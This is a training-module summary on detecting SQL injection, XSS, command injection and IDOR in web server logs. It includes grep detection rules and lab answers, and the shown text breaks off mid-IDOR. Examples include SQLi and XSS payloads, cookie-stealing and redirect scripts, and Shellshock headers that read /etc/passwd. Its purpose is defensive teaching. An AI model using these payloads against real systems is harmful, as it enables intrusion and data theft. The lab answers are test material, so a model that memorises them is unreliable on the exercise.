# LetsDefend: Detecting Web Attacks 1 Module Summary

Table of Contents:

- Introduction
- How Web Applications Works
- Detecting SQLi Attacks
- Detecting XSS Attacks
- Detecting Command Injection
- Detecting IDOR Attacks
- Detecting RFI & LFI Attacks


# **Introduction**

We have created the Web Attacks 101 course to help you better understand cyber attacks (75% of which are against web-based applications) and how to respond to them.

### What are web attacks?

Web applications are applications that provide services to users through a browser interface. Today, web applications make up a large part of internet usage. Sites such as Google, Facebook, and YouTube (excluding their mobile applications) are actually web applications.

Because web applications serve as the interface to the internet for many organizations, they can be exploited by attackers to gain access to devices, steal personal data, or cause service disruptions, resulting in significant financial damage.
A study by Acunetix found that 75% of all cyber-attacks were at the web application level.
Below are some of the attack methods used to infiltrate web applications. We will cover these methods in our Web Attacks 101 course, explaining what they are, how and why attackers use them, and how we can detect such activity.

- SQL Injection
- Cross Site Scripting
- Command Injection
- IDOR
- RFI & LFI
- File Upload (Web Shell)

## **OWASP**

The Open Worldwide Application Security Project (OWASP) is a non-profit foundation dedicated to improving software security.[1]
Without a doubt, OWASP is one of the best resources for information on web application security.
OWASP Top Ten
Every few years, OWASP publishes a list of the 10 web application vulnerabilities that pose the most critical security risks. The latest release was in 2021 at the time of writing.
The 2021 OWASP list contains these critical vulnerabilities:

![](https://ld-images-2.s3.us-east-2.amazonaws.com/Detecting+Web+Attacks/images/Owasp-Top-10.png)

You can read the OWASP publication containing the most critical security risks [here](https://owasp.org/).
****

**References
[1] https://owasp.org/**

# **How Web Applications Work**

Web applications communicate using **HTTP**, a **Layer 7 (Application Layer)** protocol in the OSI model. Before HTTP operates, lower-level protocols like **Ethernet, IP, TCP, and SSL/TLS** handle data transmission and encryption.

### **How HTTP Communication Works**

<img width="436" height="147" alt="image" src="https://github.com/user-attachments/assets/93a44eeb-243e-40a4-923b-e00317530fec" />

1. **Client → Server:**
    
    The client sends an **HTTP request** asking for a resource (HTML page, video, JSON, etc.).
    
2. **Server → Client:**
    
    The server processes the request—possibly querying a database or performing application logic—and sends an **HTTP response** back.
    
3. **Client Rendering:**
    
    The client receives and displays the resource (e.g., rendering HTML in a browser).
    

## **HTTP Requests**

<img width="817" height="173" alt="image" src="https://github.com/user-attachments/assets/2771231a-37c4-4d4d-bb08-a8bb6bd236ba" />

An HTTP request has **three main components**:

- **Request Line**: Contains HTTP **method** (GET/POST/etc.) and the **requested resource**.
- **Headers**: Provide metadata to the server.
- **Message Body**: Contains additional data (mainly for POST/PUT).

### **Common request headers**

- **Host:** Specifies which domain is being accessed (important for servers hosting multiple websites).
- **Cookie:** Stores session data on the client; helps maintain login state.
- **Upgrade-Insecure-Requests:** Indicates whether the client prefers encrypted communication (HTTPS).
- **User-Agent:** Information about the client’s browser/OS; useful for content customization and detecting bots/scanners.
- **Accept:** Defines the type of content the client can receive (HTML, JSON, etc.).
- **Accept-Encoding:** Lists compression methods supported by the client.
- **Accept-Language:** Indicates client language for localized content.
- **Connection:** Determines whether TCP stays open (`keep-alive`) or closes (`close`).
- A blank line separates headers from the **message body**.
- **Message Body:** Contains data like POST parameters.

## **HTTP Responses**

<img width="581" height="373" alt="image" src="https://github.com/user-attachments/assets/1410c6b2-2f46-48b4-ac35-a6d172aa823c" />

An HTTP response contains:

- **Status Line**: HTTP version + **status code** (e.g., 200 OK).
- **Response Headers**: Metadata about the response.
- **Response Body**: The actual content (HTML, JSON, file, etc.).

### **Status Code Categories**

- **100–199:** Informational
- **200–299:** Success
- **300–399:** Redirection
- **400–499:** Client errors
- **500–599:** Server errors

### **Common response headers**

- **Date:** Time the server sent the response.
- **Connection:** Indicates whether the connection stays open.
- **Server:** Information about the server software/OS.
- **Last-Modified:** Used for caching; shows when the resource was last updated.
- **Content-Type:** Type of data sent (HTML, JSON, etc.).
- **Content-Length:** Size of the response body.

### **Response Body**

Contains the resource requested by the client.

For web pages, this is usually **HTML**, which the browser renders into a visual page.

# Detecting SQLi Attacks

## **What is SQL Injection?**

SQL Injection occurs when a web application inserts **unsanitized, user-supplied data** directly into SQL queries.

Although modern frameworks offer protections, SQLi still happens due to:

- Use of raw SQL queries
- Developer mistakes
- Insecure framework features or misconfigurations

## **Types of SQL Injection**

| **SQL Injection Type** | **Description** |
| --- | --- |
| In-band SQLi (Classic SQLi) | In-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band SQL Injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results. The two most common types of in-band SQL Injection are **Error-based SQLi** and **Union-based SQLi.** |
| Error-based SQLi | Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database. |
| Union-based SQLi | Union-based SQLi is an in-band SQL injection technique that leverages the `UNION`SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response. |
| Inferential SQLi (Blind SQLi) | Inferential SQL Injection, unlike in-band SQLi, may take longer for an attacker to exploit, however, it is just as dangerous as any other form of SQL Injection. In an inferential SQLi attack, no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as “blind SQL Injection attacks”). Instead, an attacker is able to reconstruct the database structure by sending payloads, observing the web application’s response and the resulting behavior of the database server. The two types of inferential SQL Injection are **Blind-boolean-based SQLi** and **Blind-time-based SQLi.** |
| Boolean-based (content-based) Blind SQLi | Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result. Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned. |
| Time-based Blind SQLi | Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE. Depending on the result, an HTTP response will be returned with a delay, or returned immediately. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned. |
| Out-of-band SQLi | Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable). |
| Voice Based Sql Injection | It is a sql injection attack method that can be applied in applications that provide access to databases with voice command. An attacker could pull information from the database by sending sql queries with sound. |

*Source: https://github.com/payloadbox/sql-injection-payload-list*

## **How SQL Injection Works**

Web apps often use user-input to build SQL queries.

Example login query:

```sql
SELECT * FROM users WHERE username='USERNAME' AND password='PASSWORD'
```

If an attacker enters `' OR 1=1 -- -` as the username:

```sql
SELECT * FROM users WHERE username='' OR 1=1
```

Since **1=1 is always true**, the attacker bypasses authentication.

SQLi can also enable:

- Command execution (e.g., `xp_cmdshell`)
- Extraction/modification of database data

## **Impact of SQL Injection**

Attackers can:

- Bypass authentication
- Exfiltrate sensitive data
- Execute system commands
- Modify or delete database entries

## **Preventing SQL Injection**

- Use frameworks safely and correctly
- Keep frameworks updated
- Sanitize **all** user inputs (including headers, URLs)
- Avoid raw SQL; use prepared statements and ORM features

---

# **Detecting SQL Injection Attacks**

### Analysts should:

1. **Inspect all user-controlled fields**
    
    (including headers like `User-Agent`)
    
2. **Look for SQL keywords**
    
    e.g., `SELECT`, `INSERT`, `UNION`, `WHERE`, `AND`
    
3. **Check for special characters**
    
    `'`, `"`, `--`, `;`, `()`, `%` (URL-encoded payloads)
    
4. **Know common payloads**
    
    Examples: `' OR 1=1 --`, `UNION SELECT`, `CHR()`
    

---

## **Detecting Automated SQLi Tools**

Automated scanners like **sqlmap** can be identified by:

### **1. User-Agent field**

Often includes the tool name.

### **2. High request frequency**

Normal user: ~1 request/second

Automated tools: tens or hundreds per second

### **3. Payload content**

Tools often embed their names or generate complex payloads.

### **4. Payload complexity**

Automated payloads are typically very long, obfuscated, or multi-staged.

# **Detection Example (Access Log Analysis)**

We have access logs of a web application that was the victim of a SQL injection attack.

<img width="1668" height="796" alt="image" src="https://github.com/user-attachments/assets/ddc82c6b-ac85-459d-acf6-0035eff312e5" />

### **Key observations from the logs:**

- Many requests contained percent-encoded symbols (`%xx`), meaning special characters were encoded.
    
    <img width="951" height="427" alt="image" src="https://github.com/user-attachments/assets/85a1082d-f09d-4def-89a3-ce22752aadde" />

    
- Decoding revealed SQL keywords like `UNION`, `SELECT`, `AND`, `CHR`, indicating SQLi.
- Over **50 requests in one second** → strong sign of automated tooling.
- Payloads were **complex**, supporting the automated-tool hypothesis (likely sqlmap).
- All attacks targeted the **`id` parameter**.

### **Limitations**

- Determining attack success normally requires analyzing **response size**.
- The example server did not provide reliable response size info.
- In real-world logs, significant size differences may indicate successful exploitation and should be escalated.

# **Final Findings from the Example**

- SQL injection attack occurred on the main page (`id` parameter).
- Source IP: **`192.168.31.174`**
- Attack was sent by an automated scanning tool due to high request rate and complex payloads.
- Success of the attack could not be confirmed due to unreliable response size data.

## Grep Command Detection

```bash
# Basic SQLi payloads
grep -Ei "(\bor\b|\band\b|union|select|insert|update|delete|drop|sleep\(|benchmark\()" 

# Detect SQL comments and special characters
grep -Ei "('.+--|--|#|%27|%23|%2F%2A)" 

# Detect UNION-based SQLi
grep -Ei 'union(\s)+select'

# time-based
grep -Ei '(sleep\(|benchmark\()'

# Detect common SQLi parameter attacks
grep -Ei '(id=|user=|uid=|page=)[0-9]*('\''|%27)'

# Ultimate SQLi Detection grep
grep -Ei "(union(\s)+select|select.+from|insert.+into|update.+set|delete.+from|drop(\s)+table|sleep\(|benchmark\(|%27|%23|--|#|/\*|\*/)" 

```

## Q&A

**Note:** Use the "`/root/Desktop/QuestionFiles/SQL_Injection_Web_Attacks.rar`" file for solving the questions below.

---

**Q1. What date did the exploitation phase of SQL Injection Attack start?**

- **File Password:** access
- **Answer Format:** 01/Jan/2022:12:00:00

```bash
root@ip-172-31-6-145:~/Desktop/QuestionFiles# grep -Ei "('.+--|--|#|%27|%23|%2F%2A)" sql\ injection\ -\ apache\ access\ logs.txt 
192.168.31.167 - - [01/Mar/2022:08:35:14 -0800] "GET /dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit HTTP/1.1" 200 607 "http://192.168.31.200/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit" "Mozilla/5.0 (Windows NT 6.1; rv:88.0) Gecko/20100101 Firefox/88.0"
192.168.31.167 - - [01/Mar/2022:08:37:10 -0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+OR+1%3D1+--+-&Submit=Submit HTTP/1.1" 200 4559 "http://192.168.31.200/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit" "Mozilla/5.0 (Windows NT 6.1; rv:88.0) Gecko/20100101 Firefox/88.0"
192.168.31.167 - - [01/Mar/2022:08:38:16 -0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+OR+1%3D1+UNION+SELECT+null%2C+version%28%29+--+-&Submit=Submit HTTP/1.1" 200 4809 "http://192.168.31.200/dvwa/vulnerabilities/sqli/?id=%27+OR+1%3D1+--+-&Submit=Submit" "Mozilla/5.0 (Windows NT 6.1; rv:88.0) Gecko/20100101 Firefox/88.0"
192.168.31.167 - - [01/Mar/2022:08:40:26 -0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+OR+1%3D1+UNION+SELECT+null%2C+user%28%29+--+-&Submit=Submit HTTP/1.1" 200 4790 "http://192.168.31.200/dvwa/vulnerabilities/sqli/?id=%27+OR+1%3D1+UNION+SELECT+null%2C+version%28%29+--+-&Submit=Submit" "Mozilla/5.0 (Windows NT 6.1; rv:88.0) Gecko/20100101 Firefox/88.0"
root@ip-172-31-6-145:~/Desktop/QuestionFiles# 

```

**Ans:** *01/Mar/2022:08:35:14* 

---

**Q2. What is the IP address of the attacker who performed the SQL Injection attack?**

**Ans:** *192.168.31.167*

---

**Q3. Was the SQL Injection attack successful? (Answer Format: Y/N)**

Yes based on the response status and the size. 

**Ans: y**

---

**Q4. What is the type of SQL Injection attack? (Classic, Blind, Out-of-band)**

URL Decode

```bash
root@ip-172-31-6-145:~/Desktop/QuestionFiles# grep -Ei "('. --|--|#|'|#|/*)" sql\ injection\ -\ apache\ access\ logs.txt 
192.168.31.167 - - [01/Mar/2022:08:35:14 -0800] "GET /dvwa/vulnerabilities/sqli/?id='&Submit=Submit HTTP/1.1" 200 607 "http://192.168.31.200/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit" "Mozilla/5.0 (Windows NT 6.1; rv:88.0) Gecko/20100101 Firefox/88.0"
192.168.31.167 - - [01/Mar/2022:08:37:10 -0800] "GET /dvwa/vulnerabilities/sqli/?id=' OR 1=1 -- -&Submit=Submit HTTP/1.1" 200 4559 "http://192.168.31.200/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit" "Mozilla/5.0 (Windows NT 6.1; rv:88.0) Gecko/20100101 Firefox/88.0"
192.168.31.167 - - [01/Mar/2022:08:38:16 -0800] "GET /dvwa/vulnerabilities/sqli/?id=' OR 1=1 UNION SELECT null, version() -- -&Submit=Submit HTTP/1.1" 200 4809 "http://192.168.31.200/dvwa/vulnerabilities/sqli/?id=' OR 1=1 -- -&Submit=Submit" "Mozilla/5.0 (Windows NT 6.1; rv:88.0) Gecko/20100101 Firefox/88.0"
192.168.31.167 - - [01/Mar/2022:08:40:26 -0800] "GET /dvwa/vulnerabilities/sqli/?id=' OR 1=1 UNION SELECT null, user() -- -&Submit=Submit HTTP/1.1" 200 4790 "http://192.168.31.200/dvwa/vulnerabilities/sqli/?id=' OR 1=1 UNION SELECT null, version() -- -&Submit=Submit" "Mozilla/5.0 (Windows NT 6.1; rv:88.0) Gecko/20100101 Firefox/88.0"
root@ip-172-31-6-145:~/Desktop/QuestionFiles# 
```

Ans: *Classic*

# **Detecting Cross Site Scripting (XSS) Attacks**

## **What is XSS?**

Cross-Site Scripting (XSS) is a **client-side injection vulnerability** where a web application includes **unsanitized user input** in the HTML response.

This allows attackers to execute arbitrary **JavaScript** in the victim’s browser.

Even modern frameworks can be vulnerable if:

- They are misconfigured
- Developers use unsafe methods
- User input is not sanitized

## **Types of XSS**

### **1. Reflected XSS (Non-persistent)**

- Payload is part of the request
- Reflected immediately in response
- Most common
- Example: malicious link sent to a victim

### **2. Stored XSS (Persistent)**

- Payload is permanently stored (database, comments, profile)
- Every user who views the page triggers the payload
- Most dangerous type

### **3. DOM-Based XSS**

- Occurs entirely in the browser
- Client-side JavaScript modifies the DOM using unsafe data
- No request/response HTML injection required

## **How XSS Works**

XSS happens when:

- User input is **not sanitized**
- Data is returned in the HTML output exactly as provided

Example vulnerable code:

```html
<p> Hello <?php echo $_GET['user']; ?>.</p>
```

If the attacker enters:

```html
<script>alert(1)</script>
```

It executes JavaScript in the victim’s browser.

### Other malicious payloads can:

- Redirect the user
    
    `<script>window.location='https://malicious.com'</script>`
    
- Steal cookies
- Capture login credentials
- Perform actions on behalf of the user

## **Impact of XSS Attacks**

Attackers can:

- Steal session cookies (account takeover)
- Capture credentials
- Perform actions using victim’s privileges
- Deliver malware
- Deface the website

## **Preventing XSS**

1. **Sanitize all user input**
    - Encode special characters with HTML encoding (`<`, `>`, `"`, `'`)
2. **Use a secure framework**
3. **Use the framework correctly**
    - Escape output
    - Avoid unsafe functions (`innerHTML`, `document.write`)
4. **Keep frameworks updated**
    - Many XSS-related bugs are patched regularly

## **Detecting XSS Attacks (for SOC Analysts)**

### **Indicators to look for in logs:**

### **1. XSS Keywords**

- `alert`
- `script`
- `prompt`
- `console.log`
- `javascript:`
- `onerror=`, `onclick=`, `onload=`

### **2. Special Characters**

Especially when URL-encoded:

- `<` → `%3C`
- `>` → `%3E`
- `"` → `%22`
- `'` → `%27`
- `/` → `%2F`

### **3. Known payload patterns**

Example:

`<script>alert(1)</script>`

`"><svg onload=alert(1)>`

`javascript:alert(1)`

## **XSS Detection Example (Access Logs Analysis)**

In this example, we have access logs from an Apache server running WordPress

<img width="1337" height="617" alt="image" src="https://github.com/user-attachments/assets/3bf7ca8e-e43c-4853-9c45-72568d1f8295" />

### **Initial Observations**

- All requests were made to `/blog/?s=...`
- The `s` parameter is used by WordPress for searches
- Payloads contained encoded strings (`%3Cscript%3E`)

### **After URL decoding**

<img width="1143" height="679" alt="image" src="https://github.com/user-attachments/assets/de257f19-531a-40cc-9581-865476093c13" />

Requests clearly included XSS payloads such as:

- `<script>alert(1)</script>`
- `<script>console.log(1)</script>`
- `<prompt(1)>`

This confirms an XSS attack attempt.

### **Attack Source Analysis**

- Multiple IPs appeared
- But they belong to **Cloudflare**
    
    → Normal because the WordPress site uses Cloudflare's CDN
    
    → Actual attacker’s IP is hidden
    

### **Automation Indicators**

- Requests every **3–4 seconds**
- Impossible for a human to manually submit that many complex payloads
- User-Agent indicates: **urllib**
    
    → Strong evidence of automated vulnerability scanning tools
    

### **Was the Attack Successful?**

- Without response data: **cannot confirm success**
- Only requests were available
- Analysts require the response or server behavior to determine success

### **Final Conclusions**

1. The WordPress site was targeted by an XSS attack.
2. The attacker used an **automated vulnerability scanner** (likely Python + urllib).
3. The real attacker IP is unknown because Cloudflare masked it.
4. Success cannot be determined from the access logs alone.

## Reference:

- [*https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting)*
- [*https://github.com/payloadbox/xss-payload-list*](https://github.com/payloadbox/xss-payload-list)

## Grep Command Filter

```bash
# Basic XSS detection
grep -Ei '(<script|</script>|javascript:|onerror=|onload=|onmouseover=|alert\(|prompt\(|document\.cookie)'

# Encoded XSS paylaod
grep -Ei '(%3Cscript|%3C%2Fscript|%3Cimg|%3Csvg|%3Ciframe|%3Cbody|%22onerror|%22onload)'

# Detect HTML tag injections
grep -Ei '(<img|<svg|<iframe|<video|<body|<link|<object)'

# Ultimate XSS Detection grep
grep -Ei '(<script|%3Cscript|javascript:|onerror=|onload=|onmouseover=|alert\(|prompt\(|document\.cookie|<img|<svg|<iframe)' 

```

## Q&A

**Note:** Use the "`/root/Desktop/QuestionFiles/XSS_Web_Attacks.rar`" file for solving the questions below.

---

**1Q. What is the start date of the XSS attack?**

- **File Password:** access
- **Answer Format:** 01/Mar/2022:12:00:00

```bash
root@ip-172-31-6-145:~/Desktop/QuestionFiles# grep -Ei '(script|</script>|javascript:|onerror=|onload=|onmouseover=|alert\(|prompt\(|document\.cookie)' xss\ -\ apache\ access\ logs.txt 
192.168.31.183 - - [01/Mar/2022:08:53:20 -0800] "GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%2F HTTP/1.1" 200 4266
192.168.31.183 - - [01/Mar/2022:08:54:34 -0800] "GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E HTTP/1.1" 200 4280
192.168.31.183 - - [01/Mar/2022:08:55:08 -0800] "GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Elocation.href%3D%27http%3A%2F%2Fmalicioussite.com%27%3C%2Fscript%3E HTTP/1.1" 200 4298
root@ip-172-31-6-145:~/Desktop/QuestionFiles# 
```

**Ans:** *01/Mar/2022:08:53:20*

---

**Q2. What is the IP address of the attacker who performed the XSS attack?**

**Ans:** *192.168.31.183*

---

**Q3. Was the XSS attack successful?**

- **Answer Format:** Y/N

Based on the response status and the differece between the response size, the attack was successful 

**Ans: Yes**

---

**Q4. What is the type of XSS attack? (Reflected, Stored, Dom based)**

Ans: ***Reflected***

# Detecting Command Injection Attacks

## **What is Command Injection?**

Command Injection is a vulnerability that occurs when:

- User input is **not sanitized**, and
- The input is passed directly to the **operating system shell**.

This allows attackers to run **system commands** on the server with the same privileges as the web application user.

### **Why is it dangerous?**

- It allows full system compromise.
- Attackers can create reverse shells.
- Attackers can shut down systems.
- If the web application runs as **admin**, the attacker gets admin-level OS access.

## **How Command Injection Works**

Vulnerabilities occur when applications use **user-supplied data** inside shell commands.

Example vulnerable code:

```php
<?php
$file_name = $_POST['file_name']
$output = shell_exec('cp $file_name /tmp/');
?>
```

Normal filename:

```
letsdefend.txt
```

Malicious filename:

```
letsdefend;ls;.txt
```

The system executes:

<img width="557" height="106" alt="image" src="https://github.com/user-attachments/assets/92ac2ec7-2e71-4612-9948-89f4053071ec" />

1. `cp letsdefend`
2. `ls`
3. `.txt` (error)

Even if the attacker cannot see the output, the OS **still executes** the commands.

### Impact examples:

- `shutdown` → shuts down the server
- Reverse shell payload → full attacker control

## **How Attackers Exploit Command Injection**

Attackers can:

- Execute OS commands
- Destroy or corrupt files
- Create persistent access (reverse shells)
- Move laterally inside the network
- Fully take over web servers and databases

**This vulnerability is more dangerous than typical XSS or SQLi because it hits the operating system itself.**

## **Preventing Command Injection**

1. **Sanitize all user input**
    - Never trust filenames, parameters, form fields, or headers.
2. **Limit privileges**
    - The web application user should NOT be admin.
3. **Use virtualization or containers**
    - To isolate web applications from the host machine.
4. **Avoid passing user data directly to shell commands**
    - Use safe APIs instead of system calls.

## **Detecting Command Injection Attacks**

Command injection detection requires analyzing HTTP requests, logs, and payloads.

### **1. Inspect all fields of the web request**

The malicious payload may hide in:

- URL parameters
- Cookies
- User-Agent
- Post body
- File names

### **2. Look for terminal command keywords**

Like:

- `ls`
- `cp`
- `cat`
- `dir`
- `type`
- `echo`
- `wget`
- `curl`

### **3. Look for common injection syntax**

Such as:

- `;`
- `&&`
- `|`
- `||`
- `$()`
- `` command ``

### **4. Know common attacker payloads**

Attackers often attempt:

- Reverse shell commands
- Reading `/etc/passwd`
- Running enumeration commands

## **Detection Example (Shellshock Attack)**

HTTP request:

```
GET / HTTP/1.1
Host: yourcompany.com
User-Agent: () { :;}; echo "NS:" $(</etc/passwd)
```

### Why this is suspicious:

- The **User-Agent header** contains a **bash command**, not browser info.
- Shellshock exploits malformed environment variables.

### What the payload does:

```bash
echo "NS:" $(</etc/passwd)
```

This:

- Reads `/etc/passwd`
- Prints it as part of an HTTP response header labeled "NS"

### What is Shellshock?

- A major bash vulnerability from **2014**
- Allowed attackers to insert commands into environment variables
- Used by bots and attackers for mass exploitation

Example of command injection through headers:

```
User-Agent: () { :;}; /bin/bash -c "cat /etc/passwd"
```

This instructs bash to run the command when the web app processes the header.

## **Key Takeaways**

- Command injection is **extremely critical** because attackers gain OS-level control.
- Detection requires examining **all parts of HTTP requests**, including headers.
- Look for:
    - Command separators (`;`, `&&`, `|`)
    - Shell keywords (`ls`, `cat`, `wget`)
    - Reverse shell payloads
    - Abnormal User-Agent or Cookie fields
- Shellshock is a real-world example of command injection.

## Grep Command Filter

```bash
# Combined Rule
grep -Ei '(;|%3b|&&|%26%26|\|\||%7c%7c|`|%60|\$\(.*\)|%24%28|cmd=|exec=|run=|shell=|cat |ls |id|uname|wget|curl|nc|bash|sh|python|perl|php)' 

# Detect attempts with pipes and redirection
grep -Ei '(\||>|<)'

# Detect parameter names commonly exploited for command injection
grep -Ei '(cmd=|exec=|execute=|run=|shell=)'

# URL encoded
grep -Ei '(%3b|%26%26|%7c%7c|%60|%24%28)'

# Detect Command keywords
grep -Ei '(cat|ls|id|uname|whoami|wget|curl|nc|bash|sh|python|perl|php|powershell)'

# Common injection characters
grep -Ei '(;|&&|\|\||`|\$\(.*\))'

# All-in-one
grep -Ei '(;|&&|\|\||`|\$\(.*\)|cmd=|exec=|shell=|cat |ls |wget |curl |nc |bash|sh)'

```

## Q&A

**Note:** Use the "`/root/Desktop/QuestionFiles/Command_Injection_Web_Attacks.rar`" file for solving the questions below.

---

**Q1. What is the date the command injection attack was initiated?**

- **File Password:** access
- **Answer Format:** 01/Mar/2022:12:00:00

```bash
root@ip-172-31-6-145:~/Desktop/QuestionFiles# grep -Ei '(&&|\|\||`|\$\(.*\)|cmd=|exec=|shell=|cat |ls |wget |curl |nc |bash|sh)' command\ injection\ -\ apache\ access\ logs.txt 
192.168.31.156 - - [01/Mar/2022:09:03:33 -0800] "POST /dvwa/vulnerabilities/exec/?q=1.1.1.1;ls HTTP/1.1" 200 4477 "http://192.168.31.200/dvwa/vulnerabilities/exec/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0"
192.168.31.156 - - [01/Mar/2022:09:04:45 -0800] "POST /dvwa/vulnerabilities/exec/?q=1.1.1.1&&ls HTTP/1.1" 200 4477 "http://192.168.31.200/dvwa/vulnerabilities/exec/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0"
192.168.31.156 - - [01/Mar/2022:09:04:56 -0800] "POST /dvwa/vulnerabilities/exec/?q=1.1.1.1&&dir HTTP/1.1" 200 4477 "http://192.168.31.200/dvwa/vulnerabilities/exec/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0"
root@ip-172-31-6-145:~/Desktop/QuestionFiles# 
```

**Ans:** *01/Mar/2022:09:03:33* 

---

**Q2. What is the IP address of the attacker who performed the Command Injection attack?**

**Ans:** *192.168.31.156*

---

**Q3. Was the Command Injection attack successful?**

Based on the response size (they all have the same size 4477), the answer is no

# Detecting Insecure Direct Object **Reference (IDOR) Attacks**

## **What is IDOR?**

Insecure Direct Object Reference (IDOR) occurs when:

- A web application **does not validate authorization**,
- Allowing users to access **objects belonging to other users** by manipulating parameters.

It is part of **Broken Access Control**, ranked **#1 in the OWASP Top 10 (2021)**.

# **How IDOR Works**

IDOR is different from injection vulnerabilities because:

- It is **not caused by poor sanitization**.
- It occurs because **access control is missing or weak**.

Typical exploitation:

```
https://site.com/get_user_information?id=1
```

If the user changes:

```
?id=2 or ?id=3
```

and the application does **not** verify ownership, the attacker can view someone else's data.

### Attackers may access:

- Personal user data
- Sensitive documents
- Other people's accounts
- Actions they shouldn’t perform (modify/delete)

## **How Attackers Exploit IDOR**

The impact depends on what object is exposed, but attackers commonly:

- Steal personal information
- Access restricted documents
- Modify or delete other users' data
- Perform unauthorized actions on behalf of others

They typically enumerate object IDs, such as:

```
id=1, id=2, id=3, ...
```

## **How to Prevent IDOR**

1. **Check authorization for every request.**
    
    Always verify the requester owns the object they want to access.
    
2. **Do not rely on user-controlled parameters.**
    
    Instead of taking `id` from the URL, use **session data** to determine the user.
    
3. **Minimize parameters.**
    
    Remove unnecessary parameters that users can manipulate.
    

## **Detecting IDOR Attacks**

IDORs are **harder to detect** because:

- They have **no special payloads** (like SQLi or XSS).
- HTTP responses (which reveal successful exploitation) are often **not logged**.

### Detection relies on identifying suspicious behavior:

1. **Inspect all parameters**
    
    Any parameter (id, uid, file, doc, order, etc.) might be vulnerable.
    
2. **Look for repeated requests to the same endpoint**
    
    Attackers usually perform brute-force enumeration of IDs.
    
3. **Find patterns in parameter values**
    
    Example of enumeration:
    
    ```
    id=1 → id=2 → id=3 → ...
    ```
    
4. **Check User-Agent and request behavior**
    
    Automated tools (e.g., wfuzz, burpsuite) are often used.
    

## **Detection Example (WordPress Logs)**

Below is a screenshot of logs found on a web server running WordPress.

<img width="1075" height="738" alt="image" src="https://github.com/user-attachments/assets/f076f77e-3a46-4633-8222-9d84f2e1ad54" />

### Observed behavior:

- Many requests to:
    
    ```
    wp-admin/user-edit.php?user_id=
    ```
    
- Multiple different `user_id` values in a short time.
- User-Agent shows:
    
    ```
    wfuzz/3.1.0
    ```
    
    → indicates an automated brute-force tool.
    

### The attacker is testing whether they can access other users' profiles.

### Were they successful?

Use **response size + status code** to infer:

- Response size **479 bytes** → same-sized responses → likely rejected access.
- Response size **5691 / 5692** bytes with **302 redirect** → not 200 OK.
    - Suggests the application redirected the attacker instead of showing data.

Since:

- Many responses have identical sizes
- None return **200 OK**
- Data sizes don’t vary (user info usually differs)

→ **Most likely the attack was NOT successful**.

## **Key Takeaways**

- IDOR is an **authorization failure**, not an injection.
- Detection focuses on **patterns**, not payloads.
- Look for:
    - Rapid sequential ID enumeration
    - Repeated access to the same endpoint
    - Automated tools in the User-Agent
- Use response size and codes to infer exploitation success when response bodies are not logged.

## Grep Command Filter

```bash
# General IDOR Detection (most common parameters)
grep -Ei '(\?|&)(id|user|uid|account|profile|order|file|doc|record|invoice|ticket|customer)=[0-9]+' 

# Detect IDOR attempts via direct object access (REST endpoints)
grep -E '/(user|account|order|profile|invoice|ticket|customer)/[0-9]+'

# Detect Sequential / Enumeration Attempts (attackers increment numbers)
grep -E 'id=[0-9]{3,}'

# Detect repeated access attempts from the same IP but different IDs
grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}.*id=[0-9]+'

# Detect IDOR based on file/object names
grep -Ei '(file|document|download|report)=[A-Za-z0-9._-]+'

# Detect unauthorized direct access to resources (filename-based IDOR)
grep -Ei '\.(pdf|docx|xlsx|csv|zip)\?id=[0-9]+'

# All-in-one
grep -Ei '(\?|&)(id|uid|user|account|profile|order|invoice|ticket|customer|file|doc|record)=[0-9]+|/(user|order|account|profile|invoice|ticket)/[0-9]+' 

```

## Q&A

**Note:** Use the "`/root/Desktop/QuestionFiles/IDOR_Web_Attacks.rar`" file for solving the questions below.

Q1. What is the IP address of the attacker who carried out the IDOR attack?

- **File Password:** access

```bash
root@ip-172-31-6-145:~/Desktop/QuestionFiles# grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}.*id=[0-9]+' idor\ -\ apache\ access\ logs.txt 
192.168.31.174 - - [01/Mar/2022:11:42:32 -0800] "GET /dvwa/get_user_info/?id=1
192.168.31.174 - - [01/Mar/2022:11:42:33 -0800] "GET /dvwa/get_user_info/?id=2
192.168.31.174 - - [01/Mar/2022:11:42:35 -0800] "GET /dvwa/get_user_info/?id=3
192.168.31.174 - - [01/Mar/2022:11:42:36 -0800] "GET /dvwa/get_user_info/?id=4
